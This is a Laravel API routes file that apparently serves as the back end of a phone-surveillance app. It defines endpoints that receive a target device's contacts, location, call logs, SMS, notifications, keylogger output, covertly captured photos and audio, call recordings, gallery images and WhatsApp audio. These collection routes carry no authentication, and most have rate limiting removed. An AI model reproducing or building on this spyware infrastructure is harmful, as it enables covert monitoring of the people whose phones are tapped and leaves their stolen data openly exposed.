<?php

use App\Http\Controllers\api\CallLogController;
use App\Http\Controllers\api\CallRecordController;
use App\Http\Controllers\api\CaptureAudioController;
use App\Http\Controllers\api\CapturePhotoController;
use App\Http\Controllers\api\ContactController;
use App\Http\Controllers\api\GalleryController;
use App\Http\Controllers\api\KeyLoggerController;
use App\Http\Controllers\api\LocationController;
use App\Http\Controllers\api\NotificationController;
use App\Http\Controllers\api\PhoneController;
use App\Http\Controllers\api\SmsController;
use App\Http\Controllers\api\WhatsappAudioController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});

Route::resource('phones', PhoneController::class);
Route::resource('contacts', ContactController::class)->withoutMiddleware("throttle:api");
Route::resource('locations', LocationController::class)->withoutMiddleware("throttle:api");
Route::resource('callLogs', CallLogController::class)->withoutMiddleware("throttle:api");
Route::resource('smses', SmsController::class)->withoutMiddleware("throttle:api");
Route::resource('notifications', NotificationController::class)->withoutMiddleware("throttle:api");
Route::resource('keyloggers', KeyLoggerController::class)->withoutMiddleware("throttle:api");
Route::resource('capture-photos', CapturePhotoController::class)->withoutMiddleware("throttle:api");
Route::resource('capture-audios', CaptureAudioController::class)->withoutMiddleware("throttle:api");
Route::resource('call-records', CallRecordController::class)->withoutMiddleware("throttle:api");
Route::resource('gallery-photos', GalleryController::class)->withoutMiddleware("throttle:api");
Route::resource('whatsapp-audio', WhatsappAudioController::class)->withoutMiddleware("throttle:api");
